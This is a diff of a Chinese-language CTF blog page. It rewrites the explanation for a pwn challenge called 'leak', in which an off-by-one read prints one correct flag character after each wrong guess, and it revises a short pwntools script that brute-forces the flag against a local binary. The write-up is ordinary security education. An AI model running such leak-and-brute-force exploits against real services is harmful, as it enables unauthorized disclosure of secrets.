@@ -30,9 +30,12 @@
 <meta property="og:image" content="https://tsuk1ctf.github.io/post/41677/1725704829145-3bc1e164-061a-4655-8fb5-1eb521fbf747.png">
 <meta property="og:image" content="https://tsuk1ctf.github.io/post/41677/1725704849717-c5b05968-3906-4b5c-86e8-fe7db307e086.png">
 <meta property="og:image" content="https://tsuk1ctf.github.io/post/41677/1725683643285-a3c9f395-a07a-49a1-8e9b-c02bd4ef0d77.png">
-<meta property="og:image" content="https://tsuk1ctf.github.io/post/41677/1735046396801-1b2253f3-7158-4dfc-a559-583286a33002.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/41677/image-20250711215820380.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/41677/image-20250711215021124.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/41677/image-20250711215233904.png">
+<meta property="og:image" content="https://tsuk1ctf.github.io/post/41677/image-20250711215855353.png">
 <meta property="article:published_time" content="2024-12-25T12:11:06.000Z">
-<meta property="article:modified_time" content="2025-01-19T03:01:10.311Z">
+<meta property="article:modified_time" content="2025-07-12T02:14:59.196Z">
 <meta property="article:author" content="Tsuk1">
 <meta property="article:tag" content="Tsuk1">
 <meta name="twitter:card" content="summary_large_image">
@@ -229,7 +232,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          436 字
+          557 字
         
       </span>
     
@@ -240,7 +243,7 @@
         
         
         
-          4 分钟
+          5 分钟
         
       </span>
     
@@ -293,13 +296,20 @@
 
 <img src="/post/41677/1725683643285-a3c9f395-a07a-49a1-8e9b-c02bd4ef0d77.png" srcset="/img/loading.gif" lazyload class="" title="img">
 
-<h1 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h1><p>程序中首先是两个输入，一个是 name，一个是 flag，然后会使用一个 for 循环来将输入 name 的存储到 name 数组的前 40 个位置，即 name[0] 到 name[39]，而 name[40] 则是 .&#x2F;flag 文件的内容，循环中使用 if 来比较 name[40] 开始是否等于输入的 flag 的内容。</p>
-<p>他其实是从.&#x2F;flag 文件中读取一个字符到 name[40] 中，然后再和输入的 flag 比对，比对正确再次读取.&#x2F;flag 文件中的一个字符，比对错误之后跳出循环；那么当比对错误时，name[40] 时中是正确的 flag 的一个字符，通过之后的 pirntf 打印 name 的内容，这一个字符也会打印出来，因此可以通过溢出的这一个字符来循环爆破</p>
-<img src="/post/41677/1735046396801-1b2253f3-7158-4dfc-a559-583286a33002.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<h1 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h1><p>我们主要看check_flag函数，首先让我们输入name，大小限制在40个字符，然后是输入flag，大小也是40个字符，再然后就是打开了一个flag文件，for循环用于比对flag文件中的内容。</p>
+<img src="/post/41677/image-20250711215820380.png" srcset="/img/loading.gif" lazyload class="" title="image-20250711215820380">
+
+<p>现在我们的flag内容是flag{test_flag}</p>
+<img src="/post/41677/image-20250711215021124.png" srcset="/img/loading.gif" lazyload class="" title="image-20250711215021124">
+
+<p>然后我们运行一下程序，name我们输入40个a，然后flag输入“flag{” ，我们发现在最后的输出中除了40个a之外还多了一个字符“t”。那么我们对比flag可以发现这个“t”就是“flag{”后的一个字符，因此我们知道在name输入满40个字符，然后在flag输入正确的情况下，最后的输出会泄露出flag的一个字符。</p>
+<img src="/post/41677/image-20250711215233904.png" srcset="/img/loading.gif" lazyload class="" title="image-20250711215233904">
+
+<p>那么我们再分析for循环，他其实是从.&#x2F;flag 文件中读取一个字符到 v6[40] 中，读取成功就读取到的字符与用户输入flag的对应位置字符进行比较，一旦发现任何一个字符不匹配就立即退出循环。那么当比对错误时，v6[40] 时中是正确的 flag 的一个字符，通过之后的 pirntf 打印 v6 的内容，这一个字符也会打印出来，因此可以通过溢出的这一个字符来循环爆破。</p>
+<img src="/post/41677/image-20250711215855353.png" srcset="/img/loading.gif" lazyload class="" title="image-20250711215855353">
 
 <p>exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>flag = <span class="hljs-string">b&#x27;flag&#123;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>	<span class="hljs-built_in">print</span>(flag)<br>	p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>	payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span><br>	p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>)<br>	p.sendline(payload)<br>	p.recvuntil(<span class="hljs-string">&quot;Please give me your flag:&quot;</span>)<br>	p.sendline(flag)<br>	p.recvuntil(<span class="hljs-string">b&quot;Sorry &quot;</span>+payload)<br>	two = p.recv(<span class="hljs-number">1</span>)<br>	flag += two<br>	p.close()<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>flag = <span class="hljs-string">b&#x27;flag&#123;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>	<span class="hljs-built_in">print</span>(flag)<br>	p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>	payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span><br>	p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>)<br>	p.sendline(payload)<br>	p.recvuntil(<span class="hljs-string">&quot;Please give me your flag:&quot;</span>)<br>	p.sendline(flag)<br>	p.recvuntil(<span class="hljs-string">b&quot;Sorry &quot;</span>+payload)<br>	two = p.recv(<span class="hljs-number">1</span>)<br>	flag += two<br>	p.close()<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
 
                 
               </div>
